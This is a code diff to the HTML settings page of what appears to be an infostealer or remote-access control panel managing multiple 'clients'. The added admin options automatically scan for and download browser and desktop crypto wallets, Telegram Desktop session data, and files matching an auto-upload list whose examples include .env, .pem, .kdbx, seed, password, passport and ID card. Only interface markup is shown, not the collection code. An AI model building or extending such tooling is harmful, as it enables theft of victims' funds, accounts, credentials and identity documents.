@@ -52,15 +52,6 @@
         </div>
       </section>
 
-      <!-- Multi-client summary dashboard -->
-      <section class="card" id="summary-card" style="display:none">
-        <div class="summary-header">
-          <h2>Summary</h2>
-          <div class="summary-totals" id="summary-totals"></div>
-        </div>
-        <div id="summary-grid" class="summary-grid"></div>
-      </section>
-
       <!-- Settings (global mode, admin only) -->
       <section class="card" id="settings-card" style="display:none">
         <h2>Settings</h2>
@@ -81,7 +72,7 @@
           <div class="setting-row setting-sub" id="ah-files-row">
             <div class="setting-info">
               <span class="setting-name">Include file scan</span>
-              <span class="setting-desc">Scan for sensitive files (documents, keys, seed phrases)</span>
+              <span class="setting-desc">Scan for files matching the auto-upload list below</span>
             </div>
             <label class="toggle-label">
               <input type="checkbox" id="auto-files-toggle" disabled />
@@ -97,6 +88,36 @@
               <input type="checkbox" id="auto-ext-toggle" disabled />
               <span class="toggle-track"><span class="toggle-thumb"></span></span>
             </label>
+          </div>
+          <div class="setting-row setting-sub" id="ah-wallets-row">
+            <div class="setting-info">
+              <span class="setting-name">Include wallets</span>
+              <span class="setting-desc">Scan and auto-download browser + desktop wallets</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="auto-wallets-toggle" disabled />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-row setting-sub" id="ah-telegram-row">
+            <div class="setting-info">
+              <span class="setting-name">Include Telegram</span>
+              <span class="setting-desc">Scan Telegram Desktop tdata sessions</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="auto-telegram-toggle" disabled />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-block setting-sub" id="ah-file-list-block">
+            <div class="setting-info" style="margin-bottom:8px">
+              <span class="setting-name">Auto-upload file list</span>
+              <span class="setting-desc">When file scan is on, only match these. Extensions/names (e.g. <code>.env</code>, <code>config.json</code>) and name-contains keywords (e.g. passport, seed).</span>
+            </div>
+            <label class="setting-field-label">Extensions / exact filenames (comma or newline)</label>
+            <textarea id="auto-file-exts" class="input settings-textarea" rows="2" placeholder=".env, config.json, .pem, .kdbx" disabled></textarea>
+            <label class="setting-field-label">Name contains (comma or newline)</label>
+            <textarea id="auto-file-names" class="input settings-textarea" rows="2" placeholder="ID card, passport, wallet, seed, password" disabled></textarea>
           </div>
           <div style="height:1px;background:var(--border);margin:10px 0"></div>
           <div class="setting-row">
